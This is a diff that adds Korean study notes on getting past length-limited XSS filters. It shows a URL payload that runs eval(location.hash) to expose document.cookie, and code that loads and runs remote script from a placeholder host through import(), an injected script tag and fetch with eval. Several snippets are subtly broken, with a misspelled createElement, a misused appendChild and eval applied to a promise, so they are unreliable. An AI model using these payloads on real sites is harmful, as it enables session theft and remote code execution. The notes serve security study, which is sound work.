@@ -418,6 +418,26 @@
 <br/>
 
 ### 잘못된 방식의 XSS 필터링 6: 길이 제한
+* 삽입할 수 있는 코드의 길이가 제한되어 있는 경우 다른 경로로 실행할 추가적인 코드(payload)를 URL Fragment 등으로 삽입 후 삽입 지점에는 **본 코드를 실행하는 짧은 코드**(launcher)를 사용할 수 있음
+    - [우회 방법 1] ```location.hash```를 이용한 공격 방법
+        - Fragment로 스크립트를 넘겨준 후 XSS 지점에서 ```location.hash```로 URL의 Fragment 부분을 추출하여 ```eval()```로 실행함
+            ```
+            https://exapmple.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie);
+            ```
+    - [우회 방법 2] ```import```와 같은 외부 자원을 스크립트로 로드하여 공격하는 방법
+        ```javascript
+        // [1] import() 메서드를 통해 외부 자원을 스크립트로 로드함
+        import("http://malice.sample.com");
+
+        // [2] HTML 요소를 생성한 후 이를 추가하여 실행함
+        var e = document.createElemet('script'); // document.createElement() 메서드를 통해 tagName('script')로 지정된 HTML 요소를 반환함
+        e.src = 'http://malice.sample.com'; // src 속성에 로드할 외부 자원의 주소를 입력함
+        document.appendChild(e); // appendChild() 메소드를 통해 HTML 요소를 document의 끝에 추가함
+
+        // [3] 트워크에서 리소스를 가져오는 프로세스를 시작하고 Response 객체(promise)를 받아오는 fetch() 메소드를 통해 외부 자원으로 요청을 보내고 then() 메소드를 통해 실행할 동작을 정의함 
+        fetch('http://malice.sample.com').then(x=>eval(x.text()));
+        ```
+    - [우회 방법 3] 쿠키에 페이로드를 저장하여 공격하는 방법
 
 
 <br/><br/><br/><br/>
